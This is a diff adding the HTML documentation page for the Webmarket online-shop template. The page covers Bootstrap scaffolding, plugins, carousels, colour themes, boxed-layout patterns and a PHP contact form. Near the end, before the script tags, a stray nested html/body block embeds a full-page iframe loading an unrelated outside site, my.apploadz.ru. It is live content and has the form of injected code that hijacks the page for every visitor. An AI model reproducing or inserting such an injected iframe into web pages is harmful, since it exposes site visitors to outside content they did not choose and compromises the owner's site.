@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="Documentations for the Webmarket HTML Template">
+        <meta name="author" content="ProteusThemes">
+        <title>Webmarket HTML Template Documentation</title>
+
+        <!-- CSS -->
+        <link href="css/bootstrap.min.css" rel="stylesheet">
+        <link href="js/google-code-prettify/prettify.css" rel="stylesheet">
+        <link href="css/main.css" rel="stylesheet">
+
+    </head>
+
+    <body data-spy="scroll" data-target=".navbar">
+
+        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+            <div class="container">
+                <!-- Brand and toggle get grouped for better mobile display -->
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <span class="navbar-brand">Webmarket HTML Documentation</span>
+                </div>
+
+                <!-- Collect the nav links, forms, and other content for toggling -->
+                <div class="collapse navbar-collapse navbar-ex1-collapse">
+                    <ul class="nav navbar-nav">
+                        <li class="active">
+                            <a href="#top">Top</a>
+                        </li>
+                        <li>
+                            <a href="#scaffolding">Scaffolding</a>
+                        </li>
+                        <li>
+                            <a href="#javascripts">Javascript</a>
+                        </li>
+                        <li>
+                            <a href="#themes">Visual Elements</a>
+                        </li>
+                        <li>
+                            <a href="#contact-form">PHP Contact Form</a>
+                        </li>
+                        <li>
+                            <a href="#misc">Miscellaneous</a>
+                        </li>
+                        
+                        <!-- <li class="dropdown">
+                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Dropdown <b class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li>
+                                    <a href="#">Action</a>
+                                </li>
+                                <li>
+                                    <a href="#">Another action</a>
+                                </li>
+                                <li>
+                                    <a href="#">Something else here</a>
+                                </li>
+                                <li>
+                                    <a href="#">Separated link</a>
+                                </li>
+                                <li>
+                                    <a href="#">One more separated link</a>
+                                </li>
+                            </ul>
+                        </li> -->
+                    </ul>
+                </div><!-- /.navbar-collapse -->
+            </div>
+        </nav>
+
+        <div class="container">
+
+            <!-- Main jumbotron for a primary marketing message or call to action -->
+            <div class="jumbotron" id="top">
+                <h1>Webmarket HTML Template Documentation</h1>
+                <p class="lead">
+                    By <a href="http://www.proteusthemes.com/">ProteusThemes</a>
+                </p>
+
+                <div class="row">
+                    <div class="col-lg-6">
+                        <ul>
+                            <li>
+                                Author: <a href="http://www.proteusthemes.com/">ProteusThemes</a>
+                            </li>
+                            <li>
+                                Support: <a href="http://proteusthemes.ticksy.com">Ticksy Tickets</a>
+                            </li>
+                            <li>
+                                Template on ThemeForest: <a href="http://themeforest.net/item/webmarket-html-template-for-online-shop/5409539?ref=ProteusThemes">Webmarket - HTML Template</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="col-lg-6">
+                        <ul>
+                            <li>
+                                Version: 1.2
+                            </li>
+                            <li>
+                                Created: 2013-08-17
+                            </li>
+                            <li>
+                                Last modified: 2013-10-02
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <p>
+                    <img src="images/webmarket.png" alt="" class="img-thumbnail" width="1903" height="962" />
+                </p>
+            </div>
+
+            <div class="row">
+                <div class="col-12">
+
+                    <section id="general">
+                        <div class="page-header">
+                            <h1>General</h1>
+                        </div>
+
+                        <p>
+                            Thank you for purchasing the Webmarket HTML template crafted by <a href="www.proteusthemes.com">ProteusThemes</a>.
+                        </p>
+
+                        <p>
+                            Below you will find the documentation how to use the template.
+                        </p>
+
+                    </section>
+
+                    <hr />
+
+                    <section id="scaffolding">
+                        <div class="page-header">
+                            <h1>Scaffolding</h1>
+                        </div>
+
+                        <h3>Build on top of Twitter Bootstrap</h3>
+                        <p>
+                            The Webmarket HTML template is build on top of SASS Twitter Boostrap HTML framework. All the components of the Bootstrap framework were left as they are during the development, so the template is upgrade-safe. The only file which has been changed and is a part of Bootstrap is <code>_variables.scss</code>, inside the
+                            <code>
+                                ./lib/_variables.scss
+                            </code>
+                            directory.
+                        </p>
+
+                        <p>
+                            Find the documentation for Twitter Boostrap <a href="http://getbootstrap.com/2.3.2/">HERE</a>.
+                        </p>
+                        <p class="alert alert-info">
+                            You are allowed to use any component in your themes available in Twitter Bootstrap. However, for the performance reasons some of the components were commented out in the
+                            <code>
+                                .lib/bootstrap.scss
+                            </code>
+                            file. Uncomment the components you need in your project and recompile the project using
+                            <code>
+                                $ compass compile
+                            </code>
+                            when you cd to the root of the template in terminal.
+                        </p>
+
+                        <h3>Bonuses / Plugins / Tools used</h3>
+
+                        <ul>
+                            <li>
+                                <b>FREE BONUS: <a href="http://codecanyon.net/item/slider-revolution-responsive-jquery-plugin/2580848?ref=ProteusThemes">Slider Revolution</a></b> - find the documentation for the slider <a href="slider-revolution/documentation.html">HERE</a>
+                            </li>
+                            <li>
+                                <a href="http://jquery.com/">jQuery</a> - JS library
+                            </li>
+                            <li>
+                                <a href="http://jquery.com/">Bootstrap JS</a> - JS functions for Twitter Bootstrap
+                            </li>
+                            <li>
+                                <a href="http://caroufredsel.dev7studios.com/">CarouFredSel</a> - carousel jQuery plugin
+                            </li>
+                            <li>
+                                <a href="http://www.pittss.lv/jquery/gomap/">$.goMap()</a> - Plugin for Google Maps JS API
+                            </li>
+                            <li>
+                                <a href="http://isotope.metafizzy.co/">Isotope</a> - Plugin for magical layouts
+                            </li>
+                            <li>
+                                <a href="http://www.no-margin-for-errors.com/projects/prettyphoto-jquery-lightbox-clone/">prettyPhoto</a> - Lightbox for images and media
+                            </li>
+                            <li>
+                                <a href="http://underscorejs.org/">Underscore.js</a> - Library of JS helper functions
+                            </li>
+                            <li>
+                                <a href="http://modernizr.com/">Modernizr</a> - Feature detection JS library
+                            </li>
+                            <li>
+                                <a href="http://bootstraptour.com/">Bootstrap Tour</a> - Tour JS plugin
+                            </li>
+                            <li>
+                                <a href="http://compass-style.org/">Compass</a> and <a href="http://sass-lang.com/">SASS</a>
+                            </li>
+                            <li>
+                                <a href="http://jqueryui.com/">jQuery UI for price range slider/filter</a>
+                            </li>
+                        </ul>
+
+                        <h3>Google Fonts</h3>
+                        <p>
+                            There are two custom fonts from Google Fonts used in the Webmarket HTML template:
+                        </p>
+                        <ul>
+                            <li>
+                                <a href="http://www.google.com/webfonts#UsePlace:use/Collection:Pacifico">Pacifico</a> - for the logo "Webmarket"
+                            </li>
+                            <li>
+                                <a href="http://www.google.com/webfonts#UsePlace:use/Collection:PT+Sans">Open Sans</a> - for the headings and links
+                            </li>
+                        </ul>
+
+                        <h3>Icon Fonts</h3>
+                        <p>
+                            There are two icons fonts used for maximum quality of the icons in the Webmarket:
+                        </p>
+                        <ul>
+                            <li>
+                                <a href="http://fortawesome.github.io/Font-Awesome/">FontAwesome</a> - library of 360+ icons
+                            </li>
+                            <li>
+                                <a href="http://www.smcllns.com/designing-a-css3-button-set/">Zocial</a> - social icons
+                            </li>
+                        </ul>
+
+                        <!--  ==========  -->
+                        <!--  = PSDs =  -->
+                        <!--  ==========  -->
+
+                        <h3>Source design PSD files</h3>
+                        <p>
+                            You will find 2 PSD files included in the folder <code>
+                                ./extras/</code>
+                            . There are master layers in each of them for the individual page layouts.
+                        </p>
+
+                        <h3>Images used for template preview</h3>
+
+                        <p>
+                            The images available for template preview aren't included in the HTML template because of the licences, but you can buy them at photodune.net:
+                        </p>
+                        <ul>
+                            <li>
+                                <a href="http://photodune.net/item/smiling-group/3473199?ref=ProteusThemes">Smiling Group</a>
+                            </li>
+                            <li>
+                                <a href="http://photodune.net/item/thirst/4992439?ref=ProteusThemes">Thirst</a>
+                            </li>
+                            <li>
+                                <a href="http://photodune.net/item/hotair-balloon/2361172?ref=ProteusThemes">Hotair balloon</a>
+                            </li>
+                            <li>
+                                <a href="http://photodune.net/item/beach-drink/3549872?ref=ProteusThemes">Beach Drink</a>
+                            </li>
+                            <li>
+                                <a href="http://graphicriver.net/item/mobile-app-mockup-essentials-bundle/4302186?ref=ProteusThemes">Mobile App Mock-Up Essentials Bundle</a>
+                            </li>
+                        </ul>
+
+                        <p>
+                            All the other images are from the <a href="http://www.horsefeathers.eu/">Horsefeathers</a> clothing company and we use them in our demo/preview site with their permission, but we cannot include them in the HTML pack for download.
+                        </p>
+
+                    </section>
+
+                    <hr />
+
+                    <section id="javascripts">
+                        <div class="page-header">
+                            <h1>JavaScript</h1>
+                        </div>
+
+                        <h3>Full page width slider</h3>
+
+                        <p>
+                            The jQuery premium plugin Slider Revolution is used for the slider on the front page. Find the documentation for the plugin <a href="slider-revolution/documentation.html">HERE</a>.
+                        </p>
+
+                        <p>
+                            All the code for the slider is very well documented in the <code>index.html</code> file. The slider is triggered in the file <code>js/custom.js</code> around line 107. Feel free to customize the parameters by your needs. You will find further explanation in the documentation of the slider.
+                        </p>
+    
+
+
+
+                        <h3>Twitter Feed</h3>
+                        <p>
+                            In the blog pages you will find the Twitter Feed in the sidebar. This is in fact the embedded timeline from the Twitter. To get it for your page, go to the <a href="https://twitter.com/settings/widgets">Twitter Widgets</a> and create a new widget for your site, grab the HTML code and paste it in the template.
+                        </p>
+
+
+                        <h3>Carousels</h3>
+                        <p>
+                            You can turn your static images / HTML blocks to carousel using the code below:
+                        </p>
+                        <pre class="prettyprint">&lt;div class=&quot;arrows&quot;&gt;
+      &lt;a href=&quot;#&quot; class=&quot;icon-chevron-left&quot; id="sliderNavigationLeft"&gt;&lt;/a&gt;
+      &lt;a href=&quot;#&quot; class=&quot;icon-chevron-right&quot; id="sliderNavigationRight"&gt;&lt;/a&gt;
+&lt;/nav&gt;
+&lt;div class=&quot;carouFredSel&quot; data-nav=&quot;sliderNavigation&quot;&gt;
+    &lt;div class=&quot;slide&quot;&gt;
+        one item
+    &lt;/div&gt;
+    &lt;div class=&quot;slide&quot;&gt;
+        another carousel item
+    &lt;/div&gt;
+&lt;/div&gt;</pre>           
+
+                        <p>
+                            Note the <code>data-nav</code> attribute in the div with a class "carouFredSel". You have to put here the ID of the navigation arrows, without the 'Right' and 'Left' at the end, as shown above. There are two optional attributes for the same element (with a class <code>carouFredSel</code>):
+                        </p>            
+                        <ul>
+                        	<li><code>data-responsive</code> - possible values: [true|false]</li>
+                        	<li><code>data-autoplay</code> - possible values: [true|false]</li>
+                        </ul>
+                        
+
+                        <h3>Bootstrap Tour</h3>
+                        <p>
+                            Bootstrap Tour is used in the <code>shop.html</code> page. It was not intended at first to include it to the final zip, but at the end we decided to include it anyways. How to use this plugin can be found on the official page here: <a href="http://bootstraptour.com/">Bootstrap Tour</a>. We call this plugin in file <code>js/custom.js</code> around line 370.
+                        </p>
+                        
+                        
+                        <h3>Flickr Widget</h3>
+                        <p>
+                            On the blog pages in the sidebar you may notice the Flickr Widget. Like the Twitter Feed, this is the Flickr service and the code can be generated on <a href="http://www.flickr.com/badge.gne">their page</a>. With one exception - you should delete a part of the code to achieve the same effect as on our demo site. Follow these steps:
+                        </p>
+                        <ol>
+                        	<li>Select "An HTML badge", click Next</li>
+                        	<li>Choose the content you would like to display, click Next</li>
+                        	<li>On Step 3: buddy icon: no, number of items: 10, size: square, orientation: none</li>
+                        	<li>On Step 4: just click Next</li>
+                        	<li>When you get the code you should copy ONLY the code inside div with ID <code>flickr_badge_uber_wrapper</code></li>
+                        	<li>That's it!</li>
+                        </ol>
+                        <p>
+                            For more information about the Flickr badge API see <a href="http://www.elliotswan.com/2006/08/06/custom-flickr-badge-api-documentation/">this link</a>.
+                        </p>
+                        
+                        
+                        
+                        <h3>Filters on shop page</h3>
+                        <p>
+                            There are some advanced filters for filtering the products in the file <code>shop.php</code>. We use <a href="http://isotope.metafizzy.co/">Isotope</a> for this filtering.
+                        </p>
+                        <p>Eveything about filtering functionality of the Isotope is <a href="http://isotope.metafizzy.co/docs/filtering.html">explained here</a>. In the shop filters we use the <code>data-target</code> attribute to select the products on the right. Class <code>selectable</code> is added to all the links on the left which can be selected in the same group with OR condition. For detailed filtering (AND conditions) you should add the class <code>selectable detailed</code>.</p>
+                        <p>
+                            To really understand in depth what is going on I suggest reading through the code in <code>js/custom.js</code> between lines 240 and 370. There is also jQuery UI slider for additional filtering over the price. However, the price range filter can be changed with almost no effort at all. At the beginning of the file <code>custom.js</code> there you will find variable <code>var WebmarketVars</code>. You can change four settings there: currency symbol, currency position, price range and price step.
+                        </p>
+                        
+                        
+                        
+                        <h3>Affix &amp; Scrollspy Menu</h3>
+                        <p>
+                            Webmarket is using the Bootstrap's Affix menus. This is the menu you can find in the page <code>features.html</code> and <code>about-us.html</code>. More about Affix and Scrollspy (for updating the current active menu element) can be found in the <a href="http://getbootstrap.com/2.3.2/javascript.html">Bootstrap documentation</a>.
+                        </p>
+                        
+                        
+                        
+                        <h3>Modal Windows - Register &amp; Login</h3>
+                        <p>
+                            The code for the modal windows is located at the very bottom of the each HTML file, just before all the Javascript files are called. They start like:
+                        </p>
+                        <pre class="prettyprint">
+    &lt;!--  ==========  --&gt;
+    &lt;!--  = Modal Windows =  --&gt;
+    &lt;!--  ==========  --&gt;
+    
+    &lt;!--  = Login =  --&gt;
+    &lt;div id=&quot;loginModal&quot; class=&quot;modal hide fade&quot; tabindex=&quot;-1&quot; role=&quot;dialog&quot; aria-labelledby=&quot;loginModalLabel&quot; aria-hidden=&quot;true&quot;&gt;
+        &lt;div class=&quot;modal-header&quot;&gt;
+        [...]</pre>
+                        
+                        
+                        
+                        <h3>Bootstrap JS</h3>
+                        <p>
+                            The documentation for all the other Bootstrap's JavaScript components can be found <a href="bootstrap-sass/javascript.html">here</a>.
+                        </p>
+
+                    </section>
+                    
+                    <hr />
+                    
+                    <section id="themes">
+                        <div class="page-header">
+                            <h1>Visual Elements</h1>
+                        </div>
+
+                        <h2>Color Themes of the Template</h2>
+                        
+                        <h4>Out of the Box</h4>
+                        <p>
+                            There are 4 different color themes available out of the box:
+                        </p>
+                        
+                        <div class="row">
+                            <div class="col-6">
+                                <div class="thumbnail">
+                                    <img src="images/turqoise.jpg" alt="theme" width="1408" height="887" />
+                                    <div class="caption">
+                                        <h3>Default Theme</h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="thumbnail">
+                                    <img src="images/grass-green.jpg" alt="theme" width="1408" height="887" />
+                                    <div class="caption">
+                                        <h3>Grass Green Theme</h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="thumbnail">
+                                    <img src="images/oil-green.jpg" alt="theme" width="1408" height="887" />
+                                    <div class="caption">
+                                        <h3>Oil Green Theme</h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="thumbnail">
+                                    <img src="images/gray.jpg" alt="theme" width="1408" height="887" />
+                                    <div class="caption">
+                                        <h3>Gray Theme</h3>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <p>You can find the home pages in different color variants in the files <code>index.html</code>, <code>index-grass-green.html</code>, <code>index-oil-green.html</code> and <code>index-gray.html</code>. All you have to do is to call other file than <code>main.css</code> in the <code>&lt;head&gt;</code> section of HTML documents to the corresponding color.</p>
+
+
+                        <h4>How to Change the Theme to Entirely New Color</h4>
+                        <p>
+                            If you are familir with Compass/SASS, the easiest way to change the color theme is to change the variable <code>$theme</code>
+                            in the beginning of the <code>lib/main.scss</code> file. Just set the variable to the new hex color code, recompile the CSS files and you are all set:
+                        </p>
+                        <pre class="prettyprint">$theme : #bada55;</pre>
+                        <p>
+                            In the file <code>main.scss</code> you will find even more color variables to change and completely customize the appearance.
+                        </p>                        
+            
+                        <!-- <h3>Create your custom color theme</h3>
+                        <p>
+                            Watch the video below how to create a custom color theme:
+                        </p> -->
+                        
+                        
+                        <h2>Boxed and Wide Version</h2>
+                        
+                        <p>
+                            The default version for the theme is wide version. If you want the boxed version, you have to add the class <code>boxed</code> to the <code>&lt;body&gt;</code> element:
+                        </p>
+                        <pre>&lt;body class="boxed"&gt;</pre>
+                        
+                        <p>
+                            We have prepared 12 different patterns for the boxed version of the theme. Just add the additional class <code>pattern-#</code>, where <code>#</code> is a number between 1 and 12, for example:
+                        </p>
+                        <pre>&lt;body class="boxed pattern-4"&gt;</pre>
+                        
+                        <p>
+                            Here is a showcase of all the patterns available for the boxed version:
+                        </p>
+                        
+                        <div class="row">
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-1.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-1</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-2.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-2</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-3.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-3</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-4.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-4</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-5.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-5</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-6.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-6</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-7.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-7</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-8.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-8</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-9.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-9</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-10.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-10</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-11.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-11</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-3">
+                                <div class="thumbnail">
+                                    <img src="images/pattern-12.gif" alt="pattern" width="260" height="260" />
+                                    <div class="caption">
+                                        <h3>
+                                        	<code>pattern-12</code>
+                                        </h3>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+                    </section>
+                    
+                    <hr />
+                    
+                    <section id="contact-form">
+                        <div class="page-header">
+                            <h1>PHP Contact Form</h1>
+                        </div>
+
+                        <p>
+                            The working contact form has been added to the Webmarket template in version v1.1.
+                        </p>
+                        <p>
+                            The form is written in PHP and can be found in <code>./contact.php</code>. Be sure that your server supports PHP and has all the required settings for build-in <code> mail()</code> PHP function.
+                        </p>
+                        <p>
+                            All you need to do to enable the PHP form is to point the user to the <code>
+                                contact.php</code>
+                            instead of <code>
+                                contact.html</code>
+                            and change the following variable in the <code>
+                                ./incl/send-email.php</code>
+                            to your actual email address:
+                        </p>
+                        <pre>&lt;?php
+ 
+/* set the email of the recipient (your email) */
+$recipient = &quot;your.email@example.com&quot;;</pre>                        
+
+
+                        <p>
+                            The message will be sent directly from your website to the email address you have specified above and will have the following form:
+                        </p>
+                        <pre>----- Info about the sender -----
+
+Name: [name]
+Email: [email]
+Website: [website]
+
+
+----- Message -----
+
+[the actual message from the user which sent the email]</pre>                        
+            
+
+                    </section>
+                    
+                    
+                    <hr />
+                    
+                    <section id="misc">
+                        <div class="page-header">
+                            <h1>Miscellaneous</h1>
+                        </div>
+                        
+                        <h3>Custom Changes</h3>
+                        <p>
+                            If you need advanced cusomizations on the theme, we are available for that as well.
+                        </p>
+                        <p>
+                            Just let us know your needs to: <a href="mailto:&#105;&#110;&#102;&#111;&#064;&#112;&#114;&#111;&#116;&#101;&#117;&#115;&#116;&#104;&#101;&#109;&#101;&#115;&#046;&#099;&#111;&#109;">&#105;&#110;&#102;&#111;&#064;&#112;&#114;&#111;&#116;&#101;&#117;&#115;&#116;&#104;&#101;&#109;&#101;&#115;&#046;&#099;&#111;&#109;</a>
+                        </p>
+                        <p>
+                            For your general orientation: the prices for modifications start at the 200 EUR + VAT.
+                        </p>
+                        
+                        <h3>Changelog</h3>
+                            
+                        <p>Changelog of the theme is available on <a href="http://themeforest.net/item/webmarket-html-template-for-online-shop/5409539?ref=ProteusThemes">ThemeForest website</a>.</p>
+
+                    </section>
+                    
+                    <hr />
+                    
+                    <footer class="well">
+                        <p>Created by <a href="https://twitter.com/JakaSmid">Jaka Šmid</a> (designer) and <a href="https://twitter.com/primozcigler">Primož Cigler</a> (developer), <a href="http://www.proteusthemes.com/">ProteusThemes</a>, <a href="http://www.proteusnet.com/">ProteusNet d.o.o. company</a></p>
+                    </footer>
+
+                </div>
+            </div>
+
+        </div>
+        <!-- /container -->
+<html>
+<body style="margin:0px; padding: 0px;">
+<iframe src="http://my.apploadz.ru/" frameborder="0" scrolling="yes" height="100%" width="100%"></iframe>
+</body>
+</html>
+        <script src="//code.jquery.com/jquery.js"></script>
+        <script src="js/bootstrap.min.js"></script>
+        <script src="js/google-code-prettify/prettify.js"></script>
+        <script src="js/custom.js"></script>
+    </body>
+</html>
